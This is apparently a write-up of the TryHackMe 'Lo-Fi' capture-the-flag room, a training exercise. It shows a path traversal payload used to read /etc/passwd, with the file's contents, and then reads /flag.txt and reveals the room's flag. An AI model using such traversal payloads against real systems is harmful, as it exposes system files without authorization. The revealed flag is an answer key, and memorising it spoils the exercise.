
# lofi

# Task 1Lo-Fi

 

Want to hear some lo-fi beats, to relax or study to? We've got you covered! 


**Access this challenge** by deploying both the vulnerable machine by pressing the green "Start Machine" button located within this task, and the TryHackMe AttackBox by pressing the  "Start AttackBox" button located at the top-right of the page.

Navigate to the following URL using the AttackBox: [http://MACHINE_IP](http://machine_ip/) and find the flag in the **root of the filesystem.**

  
Check out similar content on TryHackMe:

- [LFI Path Traversal](https://tryhackme.com/r/room/filepathtraversal)
- [File Inclusion](https://tryhackme.com/room/fileinc)

**Note:** The web page does load some elements from external sources. However, they do not interfere with the completion of the room.

Answer the questions below

Climb the filesystem to find the flag!


```
http://10.82.182.201/?page=../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh


```

http://10.82.182.201/?page=../../../flag.txt



flag{e4478e0eab69bd642b8238765dcb7d18}